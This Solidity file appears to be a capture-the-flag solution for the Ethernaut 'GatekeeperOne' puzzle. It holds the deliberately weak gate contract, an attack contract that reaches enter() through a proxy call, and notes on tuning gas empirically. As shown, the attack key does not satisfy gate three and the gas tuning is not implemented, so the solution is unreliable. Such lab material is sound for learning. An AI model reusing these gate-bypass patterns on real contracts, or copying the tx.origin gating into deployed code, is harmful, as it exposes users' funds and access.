// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 0x0572B9C02192173F019F84D3f42904ed56235eAa
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

// 0xcb43aF796c6D51aE4122682D9b0b53eea927f5a6
contract GatekeeperOneAttack {
    GatekeeperOne public gatekeeperOne;
    uint public gasUsed;

    constructor(GatekeeperOne gatekeeperOne_) {
        gatekeeperOne = gatekeeperOne_;
    }

    function attack() public {
        uint gasStart = gasleft();
        gatekeeperOne.enter(bytes8(uint64(uint160(msg.sender))));
        gasUsed = gasStart - gasleft();
    }
}

/* 
Notes: 

To pass gateOne, we need to deploy an attack contract.
To pass gateTow, we need to use the gasleft() function to pass the gate.
We need to calculate the gasleft() % 8191 == 0. 
Since we can't do this in between gaetOne and gateTwo,
we need to calculate the gas gateOne uses.
The gas for our attack function - gateOne should be a multiple of 8191.
Not sure how much the require and modifier gas costs are. 
Instead of caluclating it analytically, we will calculate it empirically.
We will pass a gas amount to the function, and see how much gas it has 
when the function reverts. Then we know how much gas will be used to 
get to gateTwo, and set our gas amount appropriately.

*/
